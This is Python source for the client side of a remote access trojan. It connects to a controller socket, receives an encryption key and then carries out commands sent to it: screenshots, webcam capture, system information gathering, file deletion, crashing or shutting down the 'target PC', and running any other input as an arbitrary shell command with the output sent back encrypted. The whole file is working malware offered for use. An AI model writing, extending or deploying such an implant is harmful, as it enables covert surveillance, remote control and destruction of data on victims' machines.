
import socket
import subprocess
from Ready_commands import take_screenshot, camera_picture, get_basic_information, delete_files, Crash_Target_PC, shutdown, restart, logout
from message import CryptoManager

HOST = "127.0.0.1"
PORT = 5555

def run_client(host=HOST, port=PORT):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    key = client.recv(1024)
    crypto = CryptoManager(key)

    def send_all(data: bytes):
        client.sendall(crypto.encrypt(data))

    while True:
        cmd_encrypted = client.recv(4096)
        if not cmd_encrypted:
            break
        try:
            command = crypto.decrypt(cmd_encrypted).decode().lower()
            if command == "exit":
                break
            elif command == "screenshot":
                send_all(take_screenshot())
            elif command == "camera":
                send_all(camera_picture())
            elif command == "info":
                send_all(get_basic_information())
            elif command.startswith("delete "):
                path = command.replace("delete ", "", 1)
                send_all(delete_files(path))
            elif command == "crash":
                send_all(Crash_Target_PC())
            elif command == "shutdown":
                send_all(shutdown())
            elif command == "restart":
                send_all(restart())
            elif command == "logout":
                send_all(logout())
            else:
                result = subprocess.run(command, shell=True, capture_output=True)
                output = result.stdout + result.stderr
                send_all(output)
        except Exception as e:
            send_all(str(e).encode())

if __name__ == "__main__":
    run_client()
